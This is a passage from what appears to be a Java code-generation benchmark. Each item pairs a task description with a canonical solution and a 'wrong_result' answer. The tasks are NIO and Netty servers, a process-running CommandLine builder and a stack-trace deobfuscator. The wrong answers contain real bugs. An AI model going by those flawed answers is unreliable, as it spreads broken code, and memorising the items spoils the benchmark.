while (keys.hasNext()) {\n                        SelectionKey key = keys.next();\n                        if (key.isAcceptable()) {\n                            ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n                            SocketChannel clientChannel = serverChannel.accept();\n                            clientChannel.configureBlocking(false);\n                            clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                        }\n                        keys.remove();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private class ClientReadChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    int readyChannels = clientReadSelector.select();\n                    if (readyChannels == 0) continue;\n                    Iterator<SelectionKey> keys = clientReadSelector.selectedKeys().iterator();\n                    while (keys.hasNext()) {\n                        SelectionKey key = keys.next();\n                        if (key.isReadable()) {\n                            SocketChannel clientChannel = (SocketChannel) key.channel();\n                            ByteBuffer buffer = ByteBuffer.allocate(1024);\n                            int bytesRead = clientChannel.read(buffer);\n                            if (bytesRead == -1) {\n                                clientChannel.close();\n                                key.cancel();\n                                continue;\n                            }\n                            buffer.flip();\n                            String request = new String(buffer.array(), 0, bytesRead);\n                            String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 12\\r\\n\\r\\nHello World\";\n                            ByteBuffer responseBuffer = ByteBuffer.wrap(response.getBytes());\n                            clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE, responseBuffer);\n                            keys.remove();\n                        }\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private class ClientWriteChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    int readyChannels = clientWriteSelector.select();\n                    if (readyChannels == 0) continue;\n                    Iterator<SelectionKey> keys = clientWriteSelector.selectedKeys().iterator();\n                    while (keys.hasNext()) {\n                        SelectionKey key = keys.next();\n                        if (key.isWritable()) {\n                            SocketChannel clientChannel = (SocketChannel) key.channel();\n                            ByteBuffer buffer = (ByteBuffer) key.attachment();\n                            if (buffer != null) {\n                                clientChannel.write(buffer);\n                                if (buffer.remaining() == 0) {\n                                    buffer = null;\n                                    key.cancel();\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                }\n                            }\n                            keys.remove();\n                        }\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously using non-blocking I/O operations.\n\nClass Description: NIOServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) components. It manages multiple client connections efficiently through a single thread using a Selector to monitor events on channels.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that monitors registered channels for I/O events\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop\n- handleAccept(SelectionKey key) -> void - Handles new client connections by accepting the channel and registering it for read operations\n- handleRead(SelectionKey key) -> void - Handles incoming data from clients by reading from the channel and processing the request\n- handleWrite(SelectionKey key) -> void - Handles writing responses back to clients by preparing and sending data through the channel",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        try {\n            while (true) {\n                if (selector.select(1) > 0) {\n                    Set<SelectionKey> set = selector.selectedKeys();\n                    Iterator<SelectionKey> keyIterator = set.iterator();\n\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isAcceptable()) {\n                            handleAccept(key);\n                        } else if (key.isReadable()) {\n                            handleRead(key);\n                        } else if (key.isWritable()) {\n                            handleWrite(key);\n                        }\n                        keyIterator.remove();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((SocketChannel) key.channel());\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String msg = \"server channel write: current time mill\" + System.currentTimeMillis();\n        byteBuffer.put(msg.getBytes());\n        byteBuffer.flip();\n        clientChannel.write(byteBuffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public class NIOServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverSocketChannel.register(selector, OP_ACCEPT);\n        System.out.println(\"Server started on port \" + port);\n\n        while (true) {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                keys.remove();\n                if (key.isAcceptable()) handleAccept(key);\n                else if (key.isReadable()) handleRead(key);\n                else if (key.isWritable()) handleWrite(key);\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, OP_READ, new RequestContext());\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        RequestContext context = (RequestContext) key.attachment();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n        buffer.flip();\n        context.requestBuffer.put(buffer);\n        buffer.clear();\n        if (context.requestBuffer.remaining() == 0) {\n            String request = context.requestBuffer.toString();\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: \" + request.length() + \"\\r\\n\\r\\n\" + request;\n            ByteBuffer responseBuffer = ByteBuffer.wrap(response.getBytes());\n            clientChannel.register(selector, OP_WRITE, context);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        RequestContext context = (RequestContext) key.attachment();\n        ByteBuffer buffer = context.responseBuffer;\n        int bytesWritten = clientChannel.write(buffer);\n        if (bytesWritten > 0) {\n            buffer.flip();\n            if (buffer.remaining() == 0) {\n                clientChannel.close();\n            } else {\n                clientChannel.register(selector, OP_READ, context);\n            }\n        }\n    }\n\n    private static class RequestContext {\n        public ByteBuffer requestBuffer = ByteBuffer.allocate(1024);\n        public ByteBuffer responseBuffer = ByteBuffer.allocate(1024);\n    }\n}"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Create a Java class that implements an RPC server using Netty framework for handling network communication, managing connections, and processing RPC requests.\n\nClass Description: RpcServer is an abstract remoting server implementation that provides RPC functionality using Netty. It handles server initialization, startup, shutdown, and connection management while supporting various network configurations and user-defined processors.\n\nAttributes:\n- logger: Logger - Logger instance for server operations\n- bootstrap: ServerBootstrap - Netty server bootstrap configuration\n- channelFuture: ChannelFuture - Future representing server channel binding\n- userProcessors: ConcurrentHashMap<String, UserProcessor<?>> - Map of registered user processors\n- bossGroup: EventLoopGroup - Event loop group for accepting connections\n- workerGroup: EventLoopGroup - Event loop group for handling connections\n- addressParser: RemotingAddressParser - Parser for remote addresses\n- connectionManager: DefaultServerConnectionManager - Manager for server connections\n- rpcRemoting: RpcRemoting - RPC communication handler\n- codec: Codec - Protocol codec for encoding/decoding messages\n\nMethods:\n- RpcServer(int port, boolean manageConnection) -> void - Constructor that initializes server with port and connection management flag\n- doInit() -> void - Initializes server components including bootstrap configuration and pipeline setup\n- doStart() -> boolean - Starts the server and binds to specified port\n- doStop() -> boolean - Stops the server and releases resources\n- registerUserProcessor(UserProcessor<?> processor) -> void - Registers a user-defined processor for handling requests\n- invokeSync(Connection conn, Object request, int timeoutMillis) -> Object - Synchronously invokes RPC call with specified timeout",
    "Canonical_solution": "import com.alipay.remoting.*;\nimport com.alipay.remoting.config.BoltGenericOption;\nimport com.alipay.remoting.config.BoltServerOption;\nimport com.alipay.remoting.rpc.protocol.UserProcessor;\nimport com.alipay.remoting.util.NettyEventLoopUtil;\nimport com.alipay.remoting.util.RemotingUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.buffer.UnpooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.flush.FlushConsolidationHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ExecutorService;\n\npublic class RpcServer extends AbstractRemotingServer {\n\n    private static final Logger logger = LoggerFactory.getLogger(\"RpcRemoting\");\n    private ServerBootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>(4);\n    private final EventLoopGroup bossGroup = NettyEventLoopUtil.newEventLoopGroup(1, new NamedThreadFactory(\"Rpc-netty-server-boss\", false));\n    private static final EventLoopGroup workerGroup = NettyEventLoopUtil.newEventLoopGroup(Runtime.getRuntime().availableProcessors() * 2, new NamedThreadFactory(\"Rpc-netty-server-worker\", true));\n    private RemotingAddressParser addressParser;\n    private DefaultServerConnectionManager connectionManager;\n    protected RpcRemoting rpcRemoting;\n    private Codec codec = new RpcCodec();\n\n    public RpcServer(int port, boolean manageConnection) {\n        super(port);\n        if (manageConnection) {\n            option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH, true);\n        }\n    }\n\n    @Override\n    protected void doInit() {\n        if (this.addressParser == null) {\n            this.addressParser = new RpcAddressParser();\n        }\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH)) {\n            this.connectionManager = new DefaultServerConnectionManager(new RandomSelectStrategy(this));\n            this.connectionManager.startup();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n        this.bootstrap.group(bossGroup, workerGroup)\n            .channel(NettyEventLoopUtil.getServerSocketChannelClass())\n            .option(ChannelOption.SO_BACKLOG, ConfigManager.tcp_so_backlog())\n            .option(ChannelOption.SO_REUSEADDR, ConfigManager.tcp_so_reuseaddr())\n            .childOption(ChannelOption.TCP_NODELAY, ConfigManager.tcp_nodelay())\n            .childOption(ChannelOption.SO_KEEPALIVE, ConfigManager.tcp_so_keepalive());\n\n        if (ConfigManager.netty_buffer_pooled()) {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n        } else {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT);\n        }\n\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel channel) {\n                ChannelPipeline pipeline = channel.pipeline();\n                pipeline.addLast(\"decoder\", codec.newDecoder());\n                pipeline.addLast(\"encoder\", codec.newEncoder());\n                if (ConfigManager.tcp_idle_switch()) {\n                    pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, ConfigManager.tcp_server_idle(), TimeUnit.MILLISECONDS));\n                }\n                if (option(BoltServerOption.NETTY_FLUSH_CONSOLIDATION)) {\n                    pipeline.addLast(\"flushConsolidationHandler\", new FlushConsolidationHandler(1024, true));\n                }\n                pipeline.addLast(\"handler\", new RpcHandler(true, userProcessors));\n            }\n        });\n    }\n\n    @Override\n    protected boolean doStart() throws InterruptedException {\n        this.channelFuture = this.bootstrap.bind(new InetSocketAddress(ip(), port())).sync();\n        if (port() == 0 && channelFuture.isSuccess()) {\n            setLocalBindingPort(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n        }\n        return this.channelFuture.isSuccess();\n    }\n\n    @Override\n    protected boolean doStop() {\n        if (null != this.channelFuture) {\n            this.channelFuture.channel().close();\n        }\n        this.bossGroup.shutdownGracefully();\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH) && null != this.connectionManager) {\n            this.connectionManager.shutdown();\n        }\n        return true;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        UserProcessorRegisterHelper.registerUserProcessor(processor, this.userProcessors);\n    }\n\n    public Object invokeSync(final Connection conn, final Object request, final int timeoutMillis) throws RemotingException, InterruptedException {\n        return this.rpcRemoting.invokeSync(conn, request, null, timeoutMillis);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "wrong_result": "public abstract class RpcServer {\n    private final Logger logger;\n    private final ServerBootstrap bootstrap;\n    private final ChannelFuture channelFuture;\n    private final ConcurrentHashMap<String, UserProcessor<?>> userProcessors;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final RemotingAddressParser addressParser;\n    private final DefaultServerConnectionManager connectionManager;\n    private final RpcRemoting rpcRemoting;\n    private final Codec codec;\n\n    public RpcServer(int port, boolean manageConnection) {\n        this.logger = LoggerFactory.getLogger(RpcServer.class);\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n        this.userProcessors = new ConcurrentHashMap<>();\n        this.addressParser = new RemotingAddressParser();\n        this.connectionManager = new DefaultServerConnectionManager();\n        this.rpcRemoting = new RpcRemoting(userProcessors, addressParser, connectionManager);\n        this.codec = new Codec();\n        doInit();\n    }\n\n    private void doInit() {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(codec);\n                        if (connectionManager.isManageConnection()) {\n                            pipeline.addLast(connectionManager);\n                        }\n                        pipeline.addLast(rpcRemoting);\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    private boolean doStart() {\n        try {\n            channelFuture = bootstrap.bind(getLocalAddress()).sync();\n            logger.info(\"RpcServer started on port {}\", getLocalAddress().getPort());\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to start RpcServer\", e);\n            return false;\n        }\n    }\n\n    private boolean doStop() {\n        try {\n            if (channelFuture != null) {\n                channelFuture.channel().closeFuture().sync();\n            }\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            connectionManager.stop();\n            logger.info(\"RpcServer stopped\");\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to stop RpcServer\", e);\n            return false;\n        }\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        userProcessors.put(processor.getName(), processor);\n    }\n\n    public Object invokeSync(Connection conn, Object request, int timeoutMillis) {\n        Channel channel = conn.getChannel();\n        Object response = null;\n        try {\n            ChannelFuture future = channel.writeAndFlush(request);\n            future.sync();\n            response = future.get(timeoutMillis, TimeUnit.MILLISECONDS);\n        } catch (Exception e) {\n            logger.error(\"RPC invocation failed\", e);\n        } finally {\n            if (channel.isOpen()) {\n                channel.close();\n            }\n        }\n        return response;\n    }\n\n    protected abstract InetSocketAddress getLocalAddress();\n}"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Java class that provides a fluent interface for building and executing command-line processes with configurable environment variables, working directory, and output handling.\n\nClass Description: The CommandLine class is a builder-style utility for executing external processes. It allows chaining configuration methods to set up command arguments, environment variables, working directory, and output streams before execution. The class handles process execution, stream management, and result collection.\n\nAttributes:\n- cmdLine: List<String> - Stores the command and its arguments\n- env: Map<String, String> - Stores environment variables for the process\n- cleanEnvironment: boolean - Flag to determine whether to clear existing environment variables\n- workingDirectory: File - The working directory for the process\n- outPrefix: String - Prefix for standard output lines\n- errPrefix: String - Prefix for error output lines\n- out: OutputStream - Stream for standard output\n- err: OutputStream - Stream for error output\n\nMethods:\n- cmd(String): CommandLine - Static factory method to create a new CommandLine instance with initial command\n- workingDirectory(File): CommandLine - Sets the working directory using File object\n- workingDirectory(String): CommandLine - Sets the working directory using path string\n- arg(String): CommandLine - Adds a single argument to the command\n- args(String...): CommandLine - Adds multiple arguments to the command\n- outPrefix(String): CommandLine - Sets prefix for standard output\n- errPrefix(String): CommandLine - Sets prefix for error output\n- out(OutputStream): CommandLine - Sets standard output stream\n- err(OutputStream): CommandLine - Sets error output stream\n- env(String, String): CommandLine - Adds an environment variable\n- newEnv(boolean): CommandLine - Configures whether to clean environment variables\n- run(): ProcessRunner.ProcessResult - Executes the configured command and returns the result",
    "Canonical_solution": "import jodd.io.StreamGobbler;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n\n    public static final int OK = 0;\n\n    protected final List<String> cmdLine = new ArrayList<>();\n    protected Map<String, String> env = null;\n    protected boolean cleanEnvironment = false;\n    protected File workingDirectory;\n    protected String outPrefix;\n    protected String errPrefix;\n    protected OutputStream out = System.out;\n    protected OutputStream err = System.err;\n\n    protected CommandLine(final String command) {\n        cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(final String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(final File workDirectory) {\n        this.workingDirectory = workDirectory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(final String workDirectory) {\n        this.workingDirectory = new File(workDirectory);\n        return this;\n    }\n\n    public CommandLine arg(final String argument) {\n        cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(final String... arguments) {\n        if (arguments != null && arguments.length > 0) {\n            Collections.addAll(cmdLine, arguments);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(final String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(final String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(final OutputStream out) {\n        this.out = out;\n        return this;\n    }\n\n    public CommandLine err(final OutputStream err) {\n        this.err = err;\n        return this;\n    }\n\n    public CommandLine env(final String key, final String value) {\n        if (env == null) {\n            env = new HashMap<>();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(final boolean clean) {\n        cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        out = err = baos;\n\n        try {\n            baos.write(StringUtil.join(cmdLine, ' ').getBytes());\n            baos.write(StringPool.BYTES_NEW_LINE);\n        }\n        catch (IOException ignore) {\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(cmdLine);\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n\n        processBuilder.directory(workingDirectory);\n\n        Process process = null;\n        try {\n            process = processBuilder.start();\n        }\n        catch (IOException ioex) {\n            return writeException(baos, ioex);\n        }\n\n        StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        outputGobbler.start();\n        errorGobbler.start();\n\n        int result;\n        try {\n            result = process.waitFor();\n        }\n        catch (InterruptedException iex) {\n            return writeException(baos, iex);\n        }\n\n        outputGobbler.waitFor();\n        errorGobbler.waitFor();\n\n        return new ProcessRunner.ProcessResult(result, baos.toString());\n    }\n\n    private ProcessRunner.ProcessResult writeException(final ByteArrayOutputStream baos, final Exception ex) {\n        try {\n            baos.write(errPrefix.getBytes());\n        }\n        catch (IOException ignore) {\n        }\n\n        ex.printStackTrace(new PrintStream(baos));\n        return new ProcessRunner.ProcessResult(-1, baos.toString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class CommandLine {\n    private List<String> cmdLine;\n    private Map<String, String> env;\n    private boolean cleanEnvironment;\n    private File workingDirectory;\n    private String outPrefix;\n    private String errPrefix;\n    private OutputStream out;\n    private OutputStream err;\n\n    public static CommandLine cmd(String command) {\n        return new CommandLine(command);\n    }\n\n    private CommandLine(String cmd) {\n        this.cmdLine = new ArrayList<>();\n        this.cmdLine.add(cmd);\n        this.env = new HashMap<>();\n        this.cleanEnvironment = false;\n        this.outPrefix = \"\";\n        this.errPrefix = \"\";\n        this.out = System.out;\n        this.err = System.err;\n    }\n\n    public CommandLine workingDirectory(File dir) {\n        this.workingDirectory = dir;\n        return this;\n    }\n\n    public CommandLine workingDirectory(String path) {\n        this.workingDirectory = new File(path);\n        return this;\n    }\n\n    public CommandLine arg(String arg) {\n        this.cmdLine.add(arg);\n        return this;\n    }\n\n    public CommandLine args(String... args) {\n        for (String a : args) {\n            this.cmdLine.add(a);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(OutputStream os) {\n        this.out = os;\n        return this;\n    }\n\n    public CommandLine err(OutputStream os) {\n        this.err = os;\n        return this;\n    }\n\n    public CommandLine env(String key, String value) {\n        if (cleanEnvironment) {\n            this.env.clear();\n        }\n        this.env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(boolean clean) {\n        this.cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ProcessBuilder processBuilder = new ProcessBuilder(cmdLine);\n        if (workingDirectory != null) {\n            processBuilder.directory(workingDirectory);\n        }\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            processBuilder.environment().put(entry.getKey(), entry.getValue());\n        }\n\n        try {\n            processBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n            processBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        } catch (Exception e) {\n            // Handle exception\n        }\n\n        Process process = processBuilder.start();\n\n        Thread stdoutThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (out != null) {\n                        out.write((outPrefix + line + \"\\n\").getBytes());\n                        out.flush();\n                    }\n                }\n            } catch (IOException e) {\n                // Handle error\n            }\n        });\n\n        Thread stderrThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (err != null) {\n                        err.write((errPrefix + line + \"\\n\").getBytes());\n                        err.flush();\n                    }\n                }\n            } catch (IOException e) {\n                // Handle error\n            }\n        });\n\n        stdoutThread.start();\n        stderrThread.start();\n\n        int exitCode = -1;\n        try {\n            exitCode = process.waitFor();\n        } catch (InterruptedException e) {\n            // Handle\n        }\n\n        try {\n            stdoutThread.join();\n            stderrThread.join();\n        } catch (InterruptedException e) {\n            // Handle\n        }\n\n        return new ProcessRunner.ProcessResult(exitCode);\n    }\n}"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a function that deobfuscates a Java stack trace by processing it through an external retrace tool, handling both success and failure cases appropriately.\n\nFunction Description: The function takes a Throwable object, converts its stack trace to a string, and attempts to deobfuscate it using an external retrace script (either .bat for Windows or .sh for other systems). The function handles temporary file creation for input, process execution, and output processing, with proper error handling and fallback to the original stack trace if deobfuscation fails.\n\nInput: \n- t: Throwable - The exception/throwable whose stack trace needs to be deobfuscated\n\nOutput: \n- String - The deobfuscated stack trace if successful, or the original stack trace if deobfuscation fails or isn't possible\n\nNote: The function relies on an environment variable XPIPE_MAPPING for the mapping file path and uses system-specific retrace scripts (retrace.bat or retrace.sh). It also includes a canDeobfuscate() check (implementation not shown) to determine if deobfuscation should be attempted.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\n\npublic static String deobfuscateToString(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    String stackTrace = sw.toString();\n    stackTrace = stackTrace.replaceAll(\"at .+/(.+)\", \"at $1\");\n\n    try {\n        if (!canDeobfuscate()) {\n            return stackTrace;\n        }\n\n        var file = Files.createTempFile(\"xpipe_stracktrace\", null);\n        Files.writeString(file, stackTrace);\n        var proc = new ProcessBuilder(\n                        \"retrace.\" + (OsType.getLocal().equals(OsType.WINDOWS) ? \"bat\" : \"sh\"),\n                        System.getenv(\"XPIPE_MAPPING\"),\n                        file.toString())\n                .redirectErrorStream(true);\n        var active = proc.start();\n        var out = new String(active.getInputStream().readAllBytes())\n                .replaceAll(\"\\r\\n\", NewLine.LF.getNewLineString());\n        var code = active.waitFor();\n        if (code == 0) {\n            return out;\n        } else {\n            System.err.println(\"Deobfuscation failed: \" + out);\n        }\n    } catch (Exception ex) {\n        System.err.println(\"Deobfuscation failed\");\n        return stackTrace;\n    }\n\n    return stackTrace;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public String deobfuscate(Throwable t) {\n    if (!canDeobfuscate()) {\n        StringWriter sw = new StringWriter();\n        t.printStackTrace(new PrintWriter(sw));\n        return sw.toString();\n    }\n    String mappingPath = System.getenv(\"XPIPE_MAPPING\");\n    if (mappingPath == null) {\n        StringWriter sw = new StringWriter();\n        t.printStackTrace(new PrintWriter(sw));\n        return sw.toString();\n    }\n    StringWriter sw = new StringWriter();\n    t.printStackTrace(new PrintWriter(sw));\n    String originalStackTrace = sw.toString();\n    Path inputPath = null;\n    Path outputPath = null;\n    try {\n        inputPath = Files.createTempFile(\"retrace_input\", \".txt\");\n        outputPath = Files.createTempFile(\"retrace_output\", \".txt\");\n        Files.write(inputPath, originalStackTrace.getBytes());\n        String scriptName = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \"retrace.bat\" : \"retrace.sh\";\n        ProcessBuilder pb = new ProcessBuilder(scriptName, mappingPath, inputPath.toString(), outputPath.toString());\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return new String(Files.readAllBytes(outputPath));\n        } else {\n            return originalStackTrace;\n        }\n    } catch (Exception e) {\n        return originalStackTrace;\n    } finally {\n        try {\n            if (inputPath != null) Files.delete(inputPath);\n            if (outputPath != null) Files.delete(outputPath);\n        } catch (IOException ex) {\n        }\n    }\n}"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes with proper stream handling and synchronization.\n\nClass Description: The ProcessRunner class is designed to execute external system processes while managing their input, output, and error streams asynchronously. It provides a clean interface for process execution with automatic stream redirection and proper thread synchronization.\n\nAttributes:\n- processRoot: File - The working directory where the external process will be executed\n\nMethods:\n- Constructor: ProcessRunner(File processRoot) -> void - Initializes the ProcessRunner with the specified working directory\n- execute: execute(ProcessBuilder pb) -> void - Executes the process configured by the ProcessBuilder, redirects error stream to output, and manages stream piping asynchronously\n- AsyncPipe (inner class): \n  - Constructor: AsyncPipe(InputStream is, OutputStream os) -> void - Creates a pipe between input and output streams with automatic closing\n  - Constructor: AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) -> void - Creates a pipe with configurable stream closing behavior\n  - run: run() -> void - The thread's main execution method that continuously reads from input stream and writes to output stream",
